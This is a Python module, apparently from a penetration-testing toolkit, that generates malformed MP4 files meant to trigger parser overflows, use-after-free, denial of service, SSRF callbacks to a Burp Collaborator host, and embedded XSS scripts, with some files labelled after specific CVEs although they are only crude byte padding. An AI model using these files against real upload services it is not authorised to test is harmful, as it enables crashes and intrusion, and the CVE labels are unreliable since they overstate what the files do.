from pathlib import Path
import struct

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_mp4_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('oob'):
        oob_dir = output_dir / 'oob'
        oob_dir.mkdir(exist_ok=True)
    if should_generate_type('heap_overflow'):
        heap_overflow_dir = output_dir / 'heap_overflow'
        heap_overflow_dir.mkdir(exist_ok=True)
    if should_generate_type('uaf'):
        uaf_dir = output_dir / 'uaf'
        uaf_dir.mkdir(exist_ok=True)
    if should_generate_type('integer_overflow'):
        integer_overflow_dir = output_dir / 'integer_overflow'
        integer_overflow_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('dos'):
        dos_dir = output_dir / 'dos'
        dos_dir.mkdir(exist_ok=True)
    if should_generate_type('info_leak'):
        info_leak_dir = output_dir / 'info_leak'
        info_leak_dir.mkdir(exist_ok=True)
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    
    ftyp_atom = b'ftyp'
    moov_atom = b'moov'
    trak_atom = b'trak'
    stsd_atom = b'stsd'
    mov_atom = b'mov '
    
    def create_atom(atom_type, data):
        size = struct.pack('>I', len(data) + 8)
        return size + atom_type + data
    
    mp4_oob1_moov_size = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\xFF' * 10000)
    if should_generate_type('oob'):
        with open(oob_dir / "oob1_moov_size.mp4", 'wb') as f:
            f.write(mp4_oob1_moov_size)
    
    mp4_oob2_stsd_overflow = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, create_atom(trak_atom, create_atom(stsd_atom, b'\xFF' * 5000)))
    if should_generate_type('oob'):
        with open(oob_dir / "oob2_stsd_overflow.mp4", 'wb') as f:
            f.write(mp4_oob2_stsd_overflow)
    
    mp4_oob3_mov_read_dref = create_atom(ftyp_atom, b'isom') + create_atom(mov_atom, b'\xFF' * 8000)
    if should_generate_type('oob'):
        with open(oob_dir / "oob3_mov_read_dref.mp4", 'wb') as f:
            f.write(mp4_oob3_mov_read_dref)
    
    mp4_heap1_stsd_trak_overflow = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, create_atom(trak_atom, create_atom(stsd_atom, b'\x00' * 30000)))
    if should_generate_type('heap_overflow'):
        with open(heap_overflow_dir / "heap1_stsd_trak_overflow.mp4", 'wb') as f:
            f.write(mp4_heap1_stsd_trak_overflow)
    
    mp4_heap2_h264_tiles = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\x00' * 20000 + b'\xFF' * 15000)
    if should_generate_type('heap_overflow'):
        with open(heap_overflow_dir / "heap2_h264_tiles.mp4", 'wb') as f:
            f.write(mp4_heap2_h264_tiles)
    
    mp4_heap3_atom_size_invalid = struct.pack('>I', 0xFFFFFFFF) + moov_atom + b'\x00' * 50000
    if should_generate_type('heap_overflow'):
        with open(heap_overflow_dir / "heap3_atom_size_invalid.mp4", 'wb') as f:
            f.write(mp4_heap3_atom_size_invalid)
    
    mp4_uaf1_double_free = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\x00' * 1000) + create_atom(moov_atom, b'\x00' * 1000)
    if should_generate_type('uaf'):
        with open(uaf_dir / "uaf1_double_free.mp4", 'wb') as f:
            f.write(mp4_uaf1_double_free)
    
    mp4_uaf2_premature_free = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\x00' * 500)
    if should_generate_type('uaf'):
        with open(uaf_dir / "uaf2_premature_free.mp4", 'wb') as f:
            f.write(mp4_uaf2_premature_free)
    
    mp4_int1_atom_size_overflow = struct.pack('>I', 0xFFFFFFFF) + moov_atom + b'\x00' * 1000
    if should_generate_type('integer_overflow'):
        with open(integer_overflow_dir / "int1_atom_size_overflow.mp4", 'wb') as f:
            f.write(mp4_int1_atom_size_overflow)
    
    mp4_int2_width_height_overflow = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, struct.pack('>I', 0xFFFFFFFF) + struct.pack('>I', 0xFFFFFFFF) + b'\x00' * 1000)
    if should_generate_type('integer_overflow'):
        with open(integer_overflow_dir / "int2_width_height_overflow.mp4", 'wb') as f:
            f.write(mp4_int2_width_height_overflow)
    
    mp4_int3_allocation_negative = create_atom(ftyp_atom, b'isom') + struct.pack('>I', 0x80000000) + moov_atom + b'\x00' * 1000
    if should_generate_type('integer_overflow'):
        with open(integer_overflow_dir / "int3_allocation_negative.mp4", 'wb') as f:
            f.write(mp4_int3_allocation_negative)
    
    mp4_rce1_cve_2019_2107 = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, create_atom(trak_atom, create_atom(stsd_atom, b'\x00' * 40000 + b'\x41' * 10000)))
    if should_generate_type('rce'):
        with open(rce_dir / "rce1_cve_2019_2107.mp4", 'wb') as f:
            f.write(mp4_rce1_cve_2019_2107)
    
    mp4_rce2_cve_2023_20069 = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\xFF' * 30000 + b'\x42' * 15000)
    if should_generate_type('rce'):
        with open(rce_dir / "rce2_cve_2023_20069.mp4", 'wb') as f:
            f.write(mp4_rce2_cve_2023_20069)
    
    mp4_rce3_cve_2024_30194 = create_atom(ftyp_atom, b'isom') + struct.pack('>I', 0xFFFFFFFF) + moov_atom + b'\x00' * 40000 + b'\x43' * 20000
    if should_generate_type('rce'):
        with open(rce_dir / "rce3_cve_2024_30194.mp4", 'wb') as f:
            f.write(mp4_rce3_cve_2024_30194)
    
    mp4_dos1_invalid_atom = create_atom(ftyp_atom, b'isom') + b'\xFF' * 100
    if should_generate_type('dos'):
        with open(dos_dir / "dos1_invalid_atom.mp4", 'wb') as f:
            f.write(mp4_dos1_invalid_atom)
    
    mp4_dos2_malformed_ftyp = b'\x00' * 50 + create_atom(ftyp_atom, b'isom') + b'\xFF' * 200
    if should_generate_type('dos'):
        with open(dos_dir / "dos2_malformed_ftyp.mp4", 'wb') as f:
            f.write(mp4_dos2_malformed_ftyp)
    
    mp4_dos3_corrupted_moov = create_atom(ftyp_atom, b'isom') + struct.pack('>I', 0xFFFFFFFF) + moov_atom + b'\x00' * 1000
    if should_generate_type('dos'):
        with open(dos_dir / "dos3_corrupted_moov.mp4", 'wb') as f:
            f.write(mp4_dos3_corrupted_moov)
    
    mp4_dos4_segfault = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\xFF' * 50000)
    if should_generate_type('dos'):
        with open(dos_dir / "dos4_segfault.mp4", 'wb') as f:
            f.write(mp4_dos4_segfault)
    
    mp4_info1_oob_read = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\x00' * 10000 + b'\x41' * 5000)
    if should_generate_type('info_leak'):
        with open(info_leak_dir / "info1_oob_read.mp4", 'wb') as f:
            f.write(mp4_info1_oob_read)
    
    mp4_info2_heap_leak = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\xFF\xFF' + b'\x00' * 20000)
    if should_generate_type('info_leak'):
        with open(info_leak_dir / "info2_heap_leak.mp4", 'wb') as f:
            f.write(mp4_info2_heap_leak)
    
    mp4_info3_memory_disclosure = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'\x00' * 15000 + b'\x42' * 8000)
    if should_generate_type('info_leak'):
        with open(info_leak_dir / "info3_memory_disclosure.mp4", 'wb') as f:
            f.write(mp4_info3_memory_disclosure)
    
    mp4_ssrf1_thumbnailer_metadata = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><cover>{base_url}/ssrf-thumbnail</cover></metadata>'.encode('utf-8') + b'\x00' * 1000)
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf1_thumbnailer_metadata.mp4", 'wb') as f:
            f.write(mp4_ssrf1_thumbnailer_metadata)
    
    mp4_ssrf2_xfce_tumbler = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><art>{base_url}/ssrf-tumbler</art></metadata>'.encode('utf-8') + b'\x00' * 1000)
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf2_xfce_tumbler.mp4", 'wb') as f:
            f.write(mp4_ssrf2_xfce_tumbler)
    
    mp4_xss1_video_embed = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'<script>alert(1)</script>' + b'\x00' * 1000)
    if should_generate_type('xss'):
        with open(xss_dir / "xss1_video_embed.mp4", 'wb') as f:
            f.write(mp4_xss1_video_embed)
    
    mp4_xss2_track_src = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'<track src="javascript:alert(1)"></track>' + b'\x00' * 1000)
    if should_generate_type('xss'):
        with open(xss_dir / "xss2_track_src.mp4", 'wb') as f:
            f.write(mp4_xss2_track_src)
    
    mp4_master = create_atom(ftyp_atom, b'isom') + struct.pack('>I', 0xFFFFFFFF) + moov_atom + create_atom(trak_atom, create_atom(stsd_atom, b'\x00' * 10000 + b'\xFF' * 5000))
    with open(output_dir / "master.mp4", 'wb') as f:
                f.write(mp4_master)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'mp4', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'mp4', burp_collab, tech_filter)

